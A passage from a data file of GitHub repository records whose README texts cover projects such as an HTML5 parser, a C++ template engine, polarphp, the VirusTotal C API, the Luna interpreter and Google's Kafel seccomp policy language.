2)*\n\n*This doesn't mean that HTML5 Boilerplate cannot be used in older browsers,\njust that we'll ensure compatibility with the ones mentioned above.*\n\nIf you need legacy browser support you can use [HTML5 Boilerplate v6](https:\/\/github.com\/h5bp\/html5-boilerplate\/releases\/tag\/6.1.0) (IE9\/IE10)\nor [HTML5 Boilerplate v5](https:\/\/github.com\/h5bp\/html5-boilerplate\/releases\/tag\/5.3.0) (IE 8). They are no longer actively developed.\n\n## Documentation\n\nTake a look at the [documentation table of contents](dist\/doc\/TOC.md).\nThis documentation is bundled with the project which makes it \navailable for offline reading and provides a useful starting point for\nany documentation you want to write about your project.\n\n## Contributing\n\nHundreds of developers have helped to make the HTML5 Boilerplate. Anyone is welcome to [contribute](.github\/CONTRIBUTING.md),\nhowever, if you decide to get involved, please take a moment to review\nthe [guidelines](.github\/CONTRIBUTING.md):\n\n* [Bug reports](.github\/CONTRIBUTING.md#bugs)\n* [Feature requests](.github\/CONTRIBUTING.md#features)\n* [Pull requests](.github\/CONTRIBUTING.md#pull-requests)\n\n## License\n\nThe code is available under the [MIT license](LICENSE.txt).\n"},{"repo":"\/aredridel\/html5","language":"JavaScript","readme_contents":"HTML5 Parser for node.js\n========================\n\n[![Build Status](https:\/\/travis-ci.org\/aredridel\/html5.svg?branch=master)](https:\/\/travis-ci.org\/aredridel\/html5)\n\nExamples\n--------\n\nA simple example:\n\n```javascript\nvar HTML5 = require('html5');\nvar jsdom = require('jsdom');\nvar core = jsdom.browserAugmentation(jsdom.level(3));\n\nvar impl = new core.DOMImplementation();\nvar document = impl.createDocument();\nvar parser = new HTML5.JSDOMParser(document, core);\n\nparser.parse('<p>I am a very small HTML document<\/p>');\n\nconsole.log(document.getElementsByTagName(\"p\")[0].innerHTML);\n```\n\n\nInteresting features\n--------------------\n\n* Streaming parser: You can pass `parser.parse` an `EventEmitter` and the\n  parser will keep adding data as it's received.\n\n* HTML5 parsing algorithm. If you find something this can't parse, I'll want\n  to know about it. It should make sense out of anything a browser can.\n\nInstallation\n-------------\n\nUse `npm`, or to use the git checkout, read on.\n\nYou'll need to fetch dependencies or initialize git submodules if you're\npulling this from my git repository. \n\n\tnpm install\n\nand give it a run:\n\n\tnpm test\n\nGit repository at http:\/\/dinhe.net\/~aredridel\/projects\/js\/html5.git\/\n"},{"repo":"\/melpon\/ginger","language":"C++","readme_contents":"======\nginger\n======\n\nTemplate is here\n\n.. sourcecode:: html\n\n  <html>\n    <head>\n      <title>${title}<\/title>\n    <\/head>\n    <body>\n      <p>List of values:<\/p>\n      <ul>\n        $for x in xs {{\n          $if x.enable {{\n            <li><a href=\"${x.url}\">${x.value}<\/a><\/li>\n          }}\n        }}\n      <\/ul>\n    <\/body>\n  <\/html>\n\nSource code is here\n\n.. sourcecode:: cpp\n\n  #include \"ginger.h\"\n  #include <iostream>\n  #include <sstream>\n  #include <vector>\n  #include <map>\n  #include <string>\n\n  int main() {\n      std::vector<std::map<std::string, ginger::object>> xs;\n      xs.push_back({\n          { \"enable\", true },\n          { \"url\", \"http:\/\/example.com\" },\n          { \"value\", \"Example\" },\n      });\n      xs.push_back({\n          { \"enable\", false },\n          { \"url\", \"undefined\" },\n          { \"value\", \"Test\" },\n      });\n      xs.push_back({\n          { \"enable\", true },\n          { \"url\", \"http:\/\/google.com\" },\n          { \"value\", \"Google\" },\n      });\n\n      std::map<std::string, ginger::object> t;\n      t[\"title\"] = \"Sample Site\";\n      t[\"xs\"] = xs;\n\n      std::stringstream ss;\n      ss << std::cin.rdbuf();\n      try {\n          ginger::parse(ss.str(), t);\n      } catch (ginger::parse_error& error) {\n          std::cerr << error.long_error() << std::endl;\n      }\n  }\n\nResult\n\n.. sourcecode:: html\n\n  <html>\n    <head>\n      <title>Sample Site<\/title>\n    <\/head>\n    <body>\n      <p>List of values:<\/p>\n      <ul>\n        \n          \n            <li><a href=\"http:\/\/example.com\">Example<\/a><\/li>\n          \n        \n          \n        \n          \n            <li><a href=\"http:\/\/google.com\">Google<\/a><\/li>\n          \n        \n      <\/ul>\n    <\/body>\n  <\/html>\n\nRequirements\n============\n\nInput\n-----\n\n- below expression should be valid\n\n  .. sourcecode:: cpp\n\n    auto first = std::begin(input);\n    auto last = std::end(input);\n\n- first, last should be ForwardIterator.\n\n\nDictionary\n----------\n\n- Below expressions should be valid\n\n  .. sourcecode:: cpp\n\n    std::string var;\n    auto it = dic.find(var);\n    it != dic.end();\n\n- Type of it->second should be object.\n\nOutput\n------\n\n- Below expression should be valid\n\n  .. sourcecode:: cpp\n\n    \/\/ Output output; \/\/ default constructible is not required.\n    \/\/ For any ForwardIterator first, last\n    output.put(first, last);\n    output.flush();\n\nReference\n=========\n\nobject\n------\n\nClass ``object`` can construct from any value.\n\n.. sourcecode:: cpp\n\n  class object {\n  public:\n      object() = default;\n      object(const object&) = default;\n      object(object&&) = default;\n      object& operator=(const object&) = default;\n      object& operator=(object&&) = default;\n\n      template<class T> object(T v);\n      template<class T> void operator=(T v);\n  };\n\nparse\n-----\n\n.. sourcecode:: cpp\n\n  template<class Input, class Dictionary>\n  void parse(Input&& input, Dictionary&& t);\n  template<class Input, class Dictionary, class Output>\n  void parse(Input&& input, Dictionary&& t, Output&& out);\n\n  template<class Dictionary>\n  void parse(const char* input, Dictionary&& t);\n  template<class Dictionary, class Output>\n  void parse(const char* input, Dictionary&& t, Output&& out);\n\nTemplate Syntax Specification\n=============================\n\n::\n\n  <root> = <block>\n  <block> = (<char> | <$comment> | <$for> | <$if> | <$variable> | $$ | ${{ | $}}) <block> | <eof>\n  <char> = any character without '$'\n  <$comment> = $#<comment-char>*\n  <comment-char> = any character without '\\n' and <eof>\n  <$for> = $for <var-name> in <var> {{ <block> }}\n  <$if> = $if <var> {{ <block> }} ($elseif <var> {{ <block> }})? ($else {{ <block> }})?\n  <$variable> = ${<var>}\n  <var> = <var-name>(.<var-name>)*\n  <var-name> = <var-char>+\n  <var-char> = any character without <whitespace>, '.', '{' or '}'\n  <whitespace> = c <= 32 where c is character\n"},{"repo":"\/bigclean\/structure","language":"C","readme_contents":"Introduction\n==============\n\nSimple data structures practice.\n\nWhat included\n==============\n\n* c version, list(two implementions), stack and binary tree only.\n\n* java version, list, stack and binary tree only.\n\n* objective c version, list only.\n\n* cpp version, list only.\n\nNote\n=============\n\nBecuase these two language specific implemention is done in same period,\nso variable and functions names are mostly consistent.\n\nTodo\n==============\n\n* Add hashtable.\n\n* Add general tree.\n\n* Add ant build for java version.\n"},{"repo":"\/polarphp\/polarphp","language":"C++","readme_contents":"<img width=\"350\" src =\"https:\/\/raw.githubusercontent.com\/polarphp\/polarphp\/master\/assets\/images\/polarphp.png?sanitize=true\"\/>\n\n## Let the PHP language be great again \n\n## Why did I launch the `polarphp` project?\n\nWith the strong rise of `Go` and `NodeJS`, the market share of `PHP` has gradually been eroded, and the `PHP` official still sticks to the Web programming field. The more things you want to keep, the more you can't keep it. `polarphp` draws on the related features of `NodeJS` and `Go` to repackage `zendVM`, remove some of the old deprecated features and strong `Web` attributes of `PHP`, by implementing a new set of runtime framework `libpdk` , the `PHP` language is built into a true universal scripting language, empower `PHP`, let it have asynchronous programming, coroutine, thread, built-in `unicode` support, standard file `IO` and so on. So that the `PHP` programmer can not only do the `web` application, but also face the real server application. `polarphp` is not a new language, but a new compiler with runtime for the `PHP` language.\n\n## Main features\n\n- [ ] Compatible with the latest `PHP` language standard, removing obsolete language features\n- [ ] Built-in unicode standard support\n- [ ] Full-featured runtime library support, support for asynchronous programming, multi-threading and coroutine, etc.\n- [ ] Built-in package manager\n- [ ] Built-in document generator\n\n## Development plan\n\nDue to limited development resources, the development plan is tentatively scheduled as follows:\n\n1. Compile `zend VM` with `cmake` to generate `polarphp` custom version of `PHP` language virtual machine\n2. Language support project, language testing framework, porting `lit` test framework for `LLVM` project\n3. Implement `polarphp` driver to implement `PHP` code from the command line\n4. Regression testing of the `polarphp` virtual machine, tentatively running the language virtual machine related regression test of `PHP`\n5. Implement the built-in function of `polarphp`\n6. Publish the `docker` image of the core virtual machine\n7. Integrate the `libpdk` runtime framework\n8. Achieve user-friendly installation, try to install `polarphp` in a minimum of steps\n9. Implementation package manager\n10. Implement language widgets such as document generation tools, etc.\n\n## Start the experience\n\n> current we just test at macOS platform and you need run system in docker system.\n\n### clone polarphp repository\n```\ngit clone https:\/\/github.com\/polarphp\/polarphp.git\ncd polarphp\ngit submodule init\ngit submodule update\ngit checkout v0.0.1-alpha\n```\n### run build script\n```\n.\/devtools\/scripts\/build_polarphp.sh\n```\nAt this time, the script starts compiling the relevant image, which takes a long time. Please wait patiently. Wait for the compilation to complete, you run:\n```\ndocker images\n```\nAt this time, please confirm that there is the following docker image in the output:\n1. polarphp_base_env\n2. polarphp_debug\n\nIf there are no problems, we start testing whether polarphp is working properly in docker image.\n```\ndocker run --rm -it polarphp_debug\n```\nAfter entering the container, enter our polarphp command line program:\n```\npolar --version\n```\nIf you get the following output:\n```\npolarphp 0.0.1-git (built: 2019-01-27 12:22)\nCopyright (c) 2016-2018 The polarphp foundation (https:\/\/polar.foundation)\nZend Engine v3.3.0-dev, Copyright (c) 1998-2018 Zend Technologies\n```\n\nCongratulations, you have successfully compiled the polarphp runtime environment. When compiling the image, we put a test script in the ~\/temp\/ folder.\n```\nif (function_exists('\\php\\retrieve_version_str')) {\n    echo \"version str: \" . \\php\\retrieve_version_str() . \"\\n\";\n}\n\nif (function_exists('\\php\\retrieve_major_version')) {\n    echo \"major version: \" . \\php\\retrieve_major_version() . \"\\n\";\n}\n\nif (function_exists('\\php\\retrieve_minor_version')) {\n    echo \"minor version: \" . \\php\\retrieve_minor_version() . \"\\n\";\n}\n\nif (function_exists('\\php\\retrieve_patch_version')) {\n    echo \"patch version: \" . \\php\\retrieve_patch_version() . \"\\n\";\n}\n```\nYou can run the following command:\n```\npolar ~\/temp\/main.php\n```\nIf there are no errors, you will get the following output:\n\n```\nversion str: polarphp 0.0.1-git\nmajor version: 0\nminor version: 0\npatch version: 1\n```\nThank you for testing polarphp, what is the problem, you can put it in the github issue list\n\n## Community\n\nAt present, we only target Chinese users for the time being, so we use the communication method of WeChat and `QQ` group. The following is the QR code. Interested students can scan the code to join:\n\n> PS:Please indicate the scan code, for example: learn `polarphp` or `PHP` enthusiasts\n\n<\/div>\n<table>\n  <tbody>\n    <tr>\n      <td align=\"center\" valign=\"middle\">\n        <a href=\"https:\/\/www.oschina.net\/\" target=\"_blank\">\n         <img width = \"200\" src=\"https:\/\/raw.githubusercontent.com\/qcoreteam\/zendapi\/master\/assets\/images\/qq.png\"\/>\n        <\/a>\n      <\/td>\n      <td align=\"center\" valign=\"middle\">\n        <a href=\"https:\/\/gitee.com\/?from=polarphp.org\" target=\"_blank\">\n          <img width = \"200\" src=\"https:\/\/raw.githubusercontent.com\/qcoreteam\/zendapi\/master\/assets\/images\/wechat.png\"\/><\/div>\n        <\/a>\n      <\/td>\n    <\/tr><tr><\/tr>\n  <\/tbody>\n<\/table>\n\n## Currently has the following working groups\n\n1. Language core team\n2. Standard library team\n3. Ecosystem project team\n4. Document team\n5. Official website maintenance team\n\n## License\n\n`polarphp` is redeveloped on top of the `php` language project, following the agreement of the `php` project. For details, please see: [Project Agreement](\/LICENSE)\n\n## Contribution code guidance\n===========================\n- [CODING_STANDARDS](CODING_STANDARDS)\n- [README.GIT-RULES](docs\/README.GIT-RULES)\n- [README.MAILINGLIST_RULES](docs\/README.MAILINGLIST_RULES)\n- [README.RELEASE_PROCESS](docs\/README.RELEASE_PROCESS)\n\n## Acknowledgement\n<!--Acknowledgement begin-->\n<table>\n  <tbody>\n    <tr>\n      <td align=\"center\" valign=\"middle\">\n        <a href=\"https:\/\/www.oschina.net\/\" target=\"_blank\">\n          <img width=\"177px\" src=\"https:\/\/raw.githubusercontent.com\/polarphp\/polarphp\/master\/assets\/images\/osc.svg?sanitize=true\">\n        <\/a>\n      <\/td>\n      <td align=\"center\" valign=\"middle\">\n        <a href=\"https:\/\/gitee.com\/?from=polarphp.org\" target=\"_blank\">\n          <img width=\"177px\" src=\"https:\/\/raw.githubusercontent.com\/polarphp\/polarphp\/master\/assets\/images\/gitee.svg?sanitize=true\">\n        <\/a>\n      <\/td>\n      <td align=\"center\" valign=\"middle\">\n        <a href=\"http:\/\/www.hacknown.com\/\" target=\"_blank\">\n          <img width=\"177px\" src=\"https:\/\/raw.githubusercontent.com\/polarphp\/polarphp\/master\/assets\/images\/hacknown.svg?sanitize=true\">\n        <\/a>\n      <\/td>\n    <\/tr><tr><\/tr>\n  <\/tbody>\n<\/table>\n<!--Acknowledgement end-->\n"},{"repo":"\/VirusTotal\/c-vtapi","language":"C","readme_contents":"[![Build Status](https:\/\/travis-ci.org\/VirusTotal\/c-vtapi.svg?branch=travis)](https:\/\/travis-ci.org\/VirusTotal\/c-vtapi)\n\nVirusTotal C API library\nThis libary is designed to work with both the:\t\n\t* The public API https:\/\/www.virustotal.com\/en\/documentation\/public-api\/\n\t* The private API https:\/\/www.virustotal.com\/en\/documentation\/private-api\/\n\nRuntime Dependencies\n\t* curl or libcurl  (curl-devel package on some distributions)\n\t* janson version 2.2 (min) (2.5 or newer recommeded.  janson-devel on some distros)\n\nCompiling Dependencies\n\t* automake, autoconf  (might be autotools package on your platform)\n\t* gcc\n\t* libtool\n\nDebian or Ubuntu Dependencies:\n\tsudo apt-get install automake autoconf libtool libjansson-dev libcurl4-openssl-dev\n\nRedhat, Fedora, Centos or RPM based distros:\n\tyum install libtool jansson-devel\n\nTo compile on Linux, BSD, or Mac OS X:\n\nautoreconf -fi\n.\/configure\nmake\nsudo make install\n\nIf you wish to build the examples in the 'examples' directory:\nautoreconf -fi\n.\/configure --enable-examples\nmake\nsudo make install\n\nIf you have doxygen installed on your system you may optionally generate developer doxygen docs:\nmake doxygen-doc\n\nUsage on MS Windows is partially functioal now, but requires more patches to be fully supported.\n\nWindows compilation:\n\t* Installl mingw\n\t\t*  mingw32 gcc-g++\n\t\t*  mingw32-autoconf\n\t\t*  mingw32-automake\n\t* compile libcurl  (See their docs on windows compile)\n\nWindows compilation (MS Visual Studio)\n\t* install MS Visual Studio 2013\n\t* install CMake\n\t* Compile jansson  (see janson docs)\n\t* Compile curl  (see janson docs)\n\nSee Examples in the examples\/ directory for some example test programs which use the API.\n\n\turl --apikey=YOUR_KEY --scan http:\/\/youtube.com\n\turl --apikey=YOUR_KEY --report http:\/\/youtube.com\n\n\tscan --help\n\t.\/scan --apikey YOUR_KEY --filescan \/bin\/ls\n\t.\/scan --apikey YOUR_KEY --report HASH\n"},{"repo":"\/airtrack\/luna","language":"C++","readme_contents":"Linux & OSX: ![Build with clang](https:\/\/travis-ci.org\/airtrack\/luna.svg)\n\nLuna\n====\nAn interpreter of lua-like language written in C++ 11.\n\nBuild\n-----\n\n\tcmake -G \"Unix Makefiles\"\n\nor\n\n\tcmake -G Xcode\n\nAPI\n---\n\nGlobal function|Description\n---------------|-----------\nprint(...)|Print values to stdout\nputs(string)|Print a *string* to stdout\nipairs(table)|Returns a iterator to iterate array part of a *table*\npairs(table)|Returns a iterator to iterate a *table*(array and hash)\ntype(value)|Returns type of a *value*\ngetline()|Returns a line string which gets from stdin\nrequire(path)|Load the *path* module\n\nIO table|Description\n--------|-----------\nio.open(path [, mode])|Returns a file of *path* by *mode* when open success, otherwise returns nil and error description, *mode* is same with c function *fopen*, default is \"r\".\nio.stdin()|Returns a file of stdin\nio.stdout()|Returns a file of stdout\nio.stderr()|Returns a file of stderr\n\nFile table|Description\n----------|-----------\nfile:close()|Close file\nfile:flush()|Flush write buffer\nfile:read(...)|Read data from file, arguments could be number(read number bytes, returns as a string), \"\\*n\"(read a number and returns the number), \"\\*a\"(read whole file, returns as a string. Returns a empty string when on the end of file), \"\\*l\"(read a line, returns as a string without '\\\\n'), \"*L\"(read a line, returns as a string with '\\\\n'). Returns nil when on end of file.\nfile:seek([whence [, offset]])|Sets and gets the file position. *whence* could be \"set\", \"cur\", \"end\", *offset* is a number. If seek success, then returns the file position, otherwise returns nil and error description. Called with no argument, returns current position.\nfile:setvbuf(mode [, size])|Set the buffering mode for the output file. *mode* could be \"no\"(no buffering), \"full\"(full buffering), \"line\"(line buffering), *size* is a number specifies the size of the buffer, in bytes.\nfile:write(...)|Write the value of each argument to file, arguments could be string and number. If success, returns the file, otherwise returns nil and error description.\n\nMath table|Description\n----------|-----------\nmath.abs(x)|Same with c function *abs*\nmath.acos(x)|Same with c function *acos*\nmath.asin(x)|Same with c function *asin*\nmath.atan(x)|Same with c function *atan*\nmath.atan2(y, x)|Same with c function *atan2*\nmath.ceil(x)|Same with c function ceil\nmath.cos(x)|Same with c function *cos*\nmath.cosh(x)|Same with c function *cosh*\nmath.deg(x)|Returns the angle *x*(given in radians) in degrees.\nmath.exp(x)|Same with c function *exp*\nmath.floor(x)|Same with c function *floor*\nmath.frexp(x)|Same with c function *frexp*, returns significand of the given number in range of [0.5, 1) and exponent.\nmath.huge|The c macro HUGE_VAL\nmath.ldexp(m, e)|Same with c function *ldexp*\nmath.log(x [, base])|Same with c function *log*, the default for *base* is *e*.\nmath.max(x, ...)|Returns the maximum value\nmath.min(x, ...)|Returns the minimum value\nmath.modf(x)|Returns the integral part of *x* and the fractional part of *x*.\nmath.pi|The value of PI\nmath.pow(x, y)|Same with c function *pow*\nmath.rad(x)|Returns the angle(given in degrees) in radians.\nmath.random([m [, n]])|Returns a uniform pseudo-random number. When called with no arguments, returns a real number in the range [0, 1). When called with number *m*, returns a integer in the range [1, m]. When called with number *m* and *n*, returns a integer in the range [m, n].\nmath.randomseed(x)|Set *x* as the seed for the pseudo-random generator.\nmath.sin(x)|Same with c function *sin*\nmath.sinh(x)|Same with c function *sinh*\nmath.sqrt(x)|Same with c function *sqrt*\nmath.tan(x)|Same with c function *tan*\nmath.tanh(x)|Same with c function *tanh*\n\nString table|Description\n------------|-----------\nstring.byte(s [, i [, j]])|Returns the numerical codes of the characters s[*i*] to s[*j*]. The default value for *i* is 1.\nstring.char(...)|Returns a string with length equal to the number of arguments, in which each character has the numerical code equal to its corresponding argument.\nstring.len(s)|Returns the length of the string *s*.\nstring.lower(s)|Returns a string in which each character is lowercase.\nstring.upper(s)|Returns a string in which each character is uppercase.\nstring.reverse(s)|Returns a reverse string of the string *s*.\nstring.sub(s, i [, j])|Returns the substring of *s*[*i*..*j*].\n\nTable table|Description\n-----------|-----------\ntable.concat(t [, sep [, i [, j]]])|Concatenate *t*[*i*] .. *t*[*j*] to a string, insert *sep* between two elements, the default values for *i* is 1, *j* is #*t*, *sep* is an empty string.\ntable.insert(t, [pos ,] value)|Insert the *value* at position *pos*, by default, the *value* append to the table *t*. Returns true when insert success.\ntable.pack(...)|Pack all arguments into a table and returns it.\ntable.remove(t [, pos])|Remove the element at position *pos*, by default, remove the last element. Returns true when remove success.\ntable.unpack(t [, i [, j]])|Returns *t*[*i*] .. *t*[*j*] elements of table *t*, the default for *i* is 1, the default for *j* is #*t*.\n"},{"repo":"\/a-rodin\/qstardict","language":"C++","readme_contents":"QStarDict is a StarDict clone written using Qt4. The user interface\nis similar to StarDict.\n\nMain features\n* Full support of StarDict dictionaries\n* Working in system tray\n* Scanning mouse selection and showing popup window with translation of the\n  selected word\n* Translations reformatting\n* Pronouncing translated word\n* Plugins support\n* KDE 4 plasmoid\n"},{"repo":"\/google\/kafel","language":"C","readme_contents":"# WHAT IS IT?\nKafel is a language and library for specifying syscall filtering policies.\nThe policies are compiled into BPF code that can be used with seccomp-filter.\n\nThis is NOT an official Google product.\n\n# Usage\n\n## With verbose error reporting\n```c\nstruct sock_fprog prog;\nkafel_ctxt_t ctxt = kafel_ctxt_create();\nkafel_set_input_string(ctxt, seccomp_policy);\nif (kafel_compile(ctxt, &prog)) {\n  fprintf(stderr, \"policy compilation failed: %s\", kafel_error_msg(ctxt));\n  kafel_ctxt_destroy(&ctxt);\n  exit(-1);\n}\nkafel_ctxt_destroy(&ctxt);\nprctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog, 0, 0);\nfree(prog.filter);\n```\n\n## Without verbose error reporting\n```c\nstruct sock_fprog prog;\nif (kafel_compile_string(seccomp_policy, &prog)) {\n  fputs(\"policy compilation failed\", stderr);\n  exit(-1);\n}\nprctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog, 0, 0);\nfree(prog.filter);\n```\n\n# Policy language\n\nA simple language is used to define policies.\n\nPolicy file consists of statements.\n\nA statement can be:\n * a constant definition\n * a policy definition\n * a policy definition statement\n * a default action statement\n\nPolicy definition statements placed at file scope will be added to the implicit\ntop level policy.\nThis top level policy is going to be compiled.\n\n## Default action statement\n\n```\nDEFAULT the_action\n```\n\nSpecifies that action `the_action` should be taken when no rule matches.\n\nThe default action must be specified just once.\n\nIf the policy file specifies no default actions, the default action will\nbe KILL\n\n## Numbers\n\nKafel supports following number notations:\n * Decimal `42`\n * Hexadecimal `0xfa1`\n * Octal `0777`\n * Binary `0b10101`\n\n## Constant definitions\n\nYou may define numeric constants to make your policies more readable.\nConstant definitions may be placed almost anywhere in the policy file.\nA constant definition cannot be placed inside of a policy definition.\nThe defined constants can then be used anywhere where a number is expected.\n\n```\n#define MYCONST 123\n```\n\n## Policy definitions\n\nPolicy definition is a list of action blocks and use statements separated by\ncommas.\n\n__samples\/__ contains some example policies that demonstrate supported features.\n\n### Use statements\n\nA `USE someOtherPolicy` behaves as if `someOtherPolicy` body was pasted in its\nplace. You may only use policies defined before the use statement.\n\nWith use statements you can create meaningful groups of filtering rules that are\nbuilding blocks of bigger policies.\n\n### Action blocks\n\nAction block consist of a target and list of syscall matching rules separated\nwith commas.\n\nTarget of first rule matched is the policy decision.\n\nFollowing table list Kafel targets and their corresponding seccomp-filter\nreturn values.\n\nKafel                          | seccomp-filter\n------------------------------ | ---------------------------\n`ALLOW`                        | `SECCOMP_RET_ALLOW`\n`LOG`                          | `SECCOMP_RET_LOG`\n`KILL`, `KILL_THREAD`, `DENY`  | `SECCOMP_RET_KILL`\n`KILL_PROCESS`                 | `SECCOMP_RET_KILL_PROCESS`\n`USER_NOTIF`                   | `SECCOMP_RET_USER_NOTIF`\n`ERRNO(number)`                | `SECCOMP_RET_ERRNO+number`\n`TRAP(number)`                 | `SECCOMP_RET_TRAP+number`\n`TRACE(number)`                | `SECCOMP_RET_TRACE+number`\n\n### Syscall matching rules\n\nA rules consist of syscall name and optional list of boolean expressions.\n\nList of boolean expressions separated by commas.\nA comma is semantically equivalent to `||` but has the lowest precedence,\ntherefore it may be easier to read.\n\n#### Syscall naming\n\nNormally syscalls are specified by their names as defined in Linux kernel.\nHowever, you may also filter __custom syscalls__ that are not in the standard\nsyscall list.\nYou can either define a constant and use it in place of syscall name or\nutilize `SYSCALL` keyword.\n\n```\n#define mysyscall -1\n\nPOLICY my_const {\n  ALLOW {\n    mysyscall\n  }\n}\n\nPOLICY my_literal {\n  ALLOW {\n    SYSCALL[-1]\n  }\n}\n```\n\n#### Argument filtering\n\nBoolean expressions are used to filter syscalls based on their arguments.\nA expression resembles C language syntax, except that there are no\narithmetic operators.\n\n```\nsome_syscall(first_arg, my_arg_name) { first_arg == 42 && my_arg_name != 42 }\n```\n\nBitwise and (`&`) and or ('|') operators can be used to test for flags.\n\n```\nmmap { (prot & PROT_EXEC) == 0 },\nopen { flags == O_RDONLY|O_CLOEXEC }\n```\n\nYou don't have to declare arguments for well-known syscalls but can just use\ntheir regular names as specified in Linux kernel and `man` pages.\n\n```\nwrite { fd == 1 }\n```\n\n## Include directive\n\nIn order to simplify reuse and composition of policies, kafel provides include\nsupport.\n\n```\n#include \"some_other_file.policy\"\n```\n\nKafel looks for included files only under directories explicitly added to the\nsearch paths.\n\n```c\nkafel_include_add_search_path(ctxt, \"includes\/path\");\n```\n\nAdds `includes\/path` to search paths - the example include directive will refer\nthen to `includes\/path\/some_other_file.policy`.\n\nInclude directive is terminated by a newline or a semicolon.\nMultiple files, separated by whitespace, can be specified in one directive.\n\n```\n#include \"first.policy\" \"second.policy\"; #include \"third.policy\"\n```\n\n# Example\n\nWhen used with [nsjail](https:\/\/github.com\/google\/nsjail), the following command allows to create a fairly constrained environment for your shell\n\n```\n$ .\/nsjail --chroot \/ --seccomp_string 'POLICY a { ALLOW { write, execve, brk, access, mmap, open, newfstat, close, read, mprotect, arch_prctl, munmap, getuid, getgid, getpid, rt_sigaction, geteuid, getppid, getcwd, getegid, ioctl, fcntl, newstat, clone, wait4, rt_sigreturn, exit_group } } USE a DEFAULT KILL' -- \/bin\/sh -i\n```\n```\n[2017-01-15T21:53:08+0100] Mode: STANDALONE_ONCE\n[2017-01-15T21:53:08+0100] Jail parameters: hostname:'NSJAIL', chroot:'\/', process:'\/bin\/sh', bind:[::]:0, max_conns_per_ip:0, uid:(ns:1000, global:1000), gid:(ns:1000, global:1000), time_limit:0, personality:0, daemonize:false, clone_newnet:true, clone_newuser:true, clone_newns:true, clone_newpid:true, clone_newipc:true, clonew_newuts:true, clone_newcgroup:false, keep_caps:false, tmpfs_size:4194304, disable_no_new_privs:false, pivot_root_only:false\n[2017-01-15T21:53:08+0100] Mount point: src:'\/' dst:'\/' type:'' flags:0x5001 options:''\n[2017-01-15T21:53:08+0100] Mount point: src:'(null)' dst:'\/proc' type:'proc' flags:0x0 options:''\n[2017-01-15T21:53:08+0100] PID: 18873 about to execute '\/bin\/sh' for [STANDALONE_MODE]\n\/bin\/sh: 0: can't access tty; job control turned off\n$ set\nIFS='\n'\nOPTIND='1'\nPATH='\/usr\/local\/sbin:\/usr\/local\/bin:\/usr\/sbin:\/usr\/bin:\/sbin:\/bin'\nPPID='0'\nPS1='$ '\nPS2='> '\nPS4='+ '\nPWD='\/'\n$ id\nBad system call\n$ exit\n[2017-01-15T21:53:17+0100] PID: 18873 exited with status: 159, (PIDs left: 0)\n```\n"},{"repo":"\/kimtg\/arcadia","language":"C","readme_contents":"# Arcadia: An implementation of the Arc programming language #\r\n\r\nArc is a dialect of Lisp.\r\n\r\n## Build\r\n```\r\nmake\r\n```\r\n\r\nWith [readline](http:\/\/cnswww.cns.cwru.edu\/php\/chet\/readline\/rltop.html) support,\r\n```\r\nmake readline\r\n```\r\n\r\nWith [MinGW](http:\/\/www.mingw.org\/),\r\n```\r\nmingw32-make mingw\r\n```\r\n\r\nFor Visual C++, use .sln file.\r\n\r\n## Run\r\n```\r\nUsage: arcadia [OPTIONS...] [FILES...]\r\n\r\nOPTIONS:\r\n    -h    print this screen.\r\n    -v    print version.\r\n```\r\n\r\n## Special form\r\n`assign do fn if mac quote`\r\n\r\n## Built-in\r\n`* + - \/ < > apply bound car ccc cdr close coerce cons cos disp err expt eval flushout infile int is len log macex maptable mod newstring outfile quit rand read readline scar scdr sin sqrt sread sref stderr stdin stdout string sym system t table tan trunc type write writeb`\r\n\r\n## Library\r\n`++ -- <= = >= aand abs accum acons adjoin afn aif alist all alref and andf assoc atend atom avg before best bestn caar cadr carif caris case caselet catch cddr check commonest compare complement compose consif conswhen copy copylist count counts cut dedup def do1 dotted drain each empty even fill-table find firstn flat for forlen get idfn iflet in insert-sorted insort insortnew intersperse isa isnt iso join keep keys last len< len> let list listtab loop map map1 mappend max med median mem memtable merge mergesort min mismatch most multiple n-of nearest no noisy-each nor nthcdr number obj odd on only ontable or orf pair point pop pos positive pr prn pull push pushnew quasiquote rand-choice rand-elt range reclist recstring reduce reinsert-sorted rem repeat retrieve rev rfn rotate round roundup rreduce set single some sort split sum summing swap tablist testify tuples trues union uniq unless until vals w\/table w\/uniq when whenlet while whiler whilet wipe with withs zap`\r\n\r\n## Features\r\n* Easy-to-understand mark-and-sweep garbage collection\r\n* Tail call optimization\r\n* Implicit indexing\r\n* [Syntax sugar](http:\/\/arclanguage.github.io\/ref\/evaluation.html) (`[]`, `~`, `.`, `!`, `:`)\r\n\r\n## See also\r\n* [Arc Tutorial](http:\/\/old.ycombinator.com\/arc\/tut.txt)\r\n* [Arc Documentation](http:\/\/arclanguage.github.io\/ref\/index.html)\r\n* [Try Arc: Arc REPL In Your Web Browser](http:\/\/tryarc.org\/)\r\n\r\n## License ##\r\n\r\n   Copyright 2014-2019 Kim, Taegyoon\r\n\r\n   Licensed under the Apache License, Version 2.0 (the \"License\");\r\n   you may not use this file except in compliance with the License.\r\n   You may obtain a copy of the License at\r\n\r\n   [http:\/\/www.apache.org\/licenses\/LICENSE-2.0](http:\/\/www.apache.org\/licenses\/LICENSE-2.0)\r\n\r\n   Unless required by applicable law or agreed to in writing, software\r\n   distributed under the License is distributed on an \"AS IS\" BASIS,\r\n   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\r\n   See the License for the specific language governing permissions and\r\n   limitations under the License.\r\n"},{"repo":"\/liudf0716\/xkcptun","language":"C","readme_contents":"![xkcptun](https:\/\/github.com\/liudf0716\/xkcptun\/blob\/master\/logo-big.png)\n\n[![Build Status][1]][2] \n[![Powered][3]][4]\n[![license][5]][6]\n[![PRs Welcome][7]][8]\n[![Issue Welcome][9]][10]\n[![OpenWRT][11]][12]\n[![KunTeng][13]][14]\n\n[1]: https:\/\/img.shields.io\/travis\/liudf0716\/xkcptun.svg?style=plastic\n[2]: https:\/\/travis-ci.org\/liudf0716\/xkcptun\n[3]: https:\/\/img.shields.io\/badge\/KCP-Powered-blue.svg?style=plastic\n[4]: https:\/\/github.com\/skywind3000\/kcp\n[5]: https:\/\/img.shields.io\/badge\/license-GPLV3-brightgreen.svg?style=plastic\n[6]: https:\/\/github.com\/KunTengRom\/xfrp\/blob\/master\/LICENSE\n[7]: https:\/\/img.shields.io\/badge\/PRs-welcome-brightgreen.svg?style=plastic\n[8]: https:\/\/github.com\/liudf0716\/xkcptun\/pulls\n[9]: 